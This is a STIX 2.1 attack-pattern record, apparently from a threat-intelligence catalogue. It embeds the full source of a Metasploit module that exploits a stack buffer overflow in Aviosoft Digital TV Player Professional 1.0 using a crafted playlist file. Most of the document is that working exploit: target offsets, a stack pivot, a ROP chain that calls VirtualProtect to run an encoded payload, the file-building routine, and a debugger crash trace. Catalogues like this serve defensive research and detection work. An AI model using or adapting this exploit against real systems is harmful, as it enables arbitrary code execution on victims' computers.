{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9256e2ea-0c0c-412e-ad91-2cc82d371265",
    "created": "2024-08-14T16:36:34.703685Z",
    "modified": "2024-08-14T16:36:34.70369Z",
    "name": "\"Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in Aviosoft Digital TV Player Pro version 1.x.  An overflow occurs when the process copies the content of a playlist file on to the stack, which may result arbitrary code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/aviosoft_plf_buf.rb",
            "external_id": "aviosoft_plf_buf.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow\",\n      'Description'    => %q{\n            This module exploits a vulnerability found in Aviosoft Digital TV Player\n          Pro version 1.x.  An overflow occurs when the process copies the content of a\n          playlist file on to the stack, which may result arbitrary code execution under\n          the context of the user.\n        },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'modpr0be',  #Initial discovery, poc\n          'sinn3r',    #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '77043'],\n          ['EDB', '18096'],\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x1a\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"seh\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Aviosoft DTV Player 1.0.1.2',\n            {\n              'Ret'    => 0x6130534a,  #Stack pivot (ADD ESP,800; RET)\n              'Offset' => 612,         #Offset to SEH\n              'Max'    => 5000         #Max buffer size\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-11-09',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [false, 'The playlist name', 'msf.plf'])\n        ])\n  end\n\n  def junk(n=1)\n    return [rand_text_alpha(4).unpack(\"L\")[0]] * n\n  end\n\n  def nops(rop=false, n=1)\n    return rop ? [0x61326003] * n : [0x90909090] * n\n  end\n\n  def exploit\n    rop = [\n      nops(true, 10),  #ROP NOP\n      0x6405347a,      #POP EDX # RETN (MediaPlayerCtrl.dll)\n      0x10011108,      #ptr to &VirtualProtect\n      0x64010503,      #PUSH EDX # POP EAX # POP ESI # RETN (MediaPlayerCtrl.dll)\n      junk,\n      0x6160949f,      #MOV ECX,DWORD PTR DS:[EDX] # POP ESI (EPG.dll)\n      junk(3),\n      0x61604218,      #PUSH ECX # ADD AL,5F # XOR EAX,EAX # POP ESI # RETN 0C (EPG.dll)\n      junk(3),\n      0x6403d1a6,      #POP EBP # RETN (MediaPlayerCtrl.dll)\n      junk(3),\n      0x60333560,      #& push esp #  ret 0c (Configuration.dll)\n      0x61323EA8,      #POP EAX # RETN (DTVDeviceManager.dll)\n      0xA13977DF,      #0x00000343-> ebx\n      0x640203fc,      #ADD EAX,5EC68B64 # RETN (MediaPlayerCtrl.dll)\n      0x6163d37b,      #PUSH EAX # ADD AL,5E # POP EBX # RETN (EPG.dll)\n      0x61626807,      #XOR EAX,EAX # RETN (EPG.dll)\n      0x640203fc,      #ADD EAX,5EC68B64 # RETN (MediaPlayerCtrl.dll)\n      0x6405347a,      #POP EDX # RETN (MediaPlayerCtrl.dll)\n      0xA13974DC,      #0x00000040-> edx\n      0x613107fb,      #ADD EDX,EAX # MOV EAX,EDX # RETN (DTVDeviceManager.dll)\n      0x60326803,      #POP ECX # RETN (Configuration.dll)\n      0x60350340,      #&Writable location\n      0x61329e07,      #POP EDI # RETN (DTVDeviceManager.dll)\n      nops(true),      #ROP NOP\n      0x60340178,      #POP EAX # RETN\n      nops,            #Regular NOPs\n      0x60322e02       #PUSH # RETN\n    ].flatten.pack(\"V*\")\n\n    buf  = ''\n    buf << rand_text_alpha(target['Offset']-buf.length)\n    buf << [target.ret].pack('V*')\n    buf << rand_text_alpha(136)\n    buf << rop\n    buf << make_nops(32)\n    buf << payload.encoded\n    buf << rand_text_alpha(target['Max']-buf.length)\n\n    file_create(buf)\n  end\nend\n\n=begin\neax=00001779 ebx=047a02c0 ecx=000001f4 edx=047a6814 esi=047a77bc edi=00130000\neip=6400f6f0 esp=0012f038 ebp=00000001 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nMediaPlayerCtrl!DllCreateObject+0x220:\n6400f6f0 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n0:000> !exchain\n0012f3bc: *** WARNING: Unable to verify checksum for C:\\Program Files\\Aviosoft\\Aviosoft DTV Player Pro\\DTVDeviceManager.dll\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\Aviosoft\\Aviosoft DTV Player Pro\\DTVDeviceManager.dll -\nDTVDeviceManager+534a (6130534a)\nInvalid exception stack at 41414141\n0:000> !address edi\n    00130000 : 00130000 - 00003000\n                    Type     00040000 MEM_MAPPED\n                    Protect  00000002 PAGE_READONLY\n                    State    00001000 MEM_COMMIT\n                    Usage    RegionUsageIsVAD\n0:000> !address esi\n    047a0000 : 047a0000 - 0000b000\n                    Type     00020000 MEM_PRIVATE\n                    Protect  00000004 PAGE_READWRITE\n                    State    00001000 MEM_COMMIT\n                    Usage    RegionUsageHeap\n                    Handle   013c0000\n=end\n",
    "x_mitre_disclosure_date": "2011-11-09",
    "x_mitre_platforms": [
        "win'"
    ]
}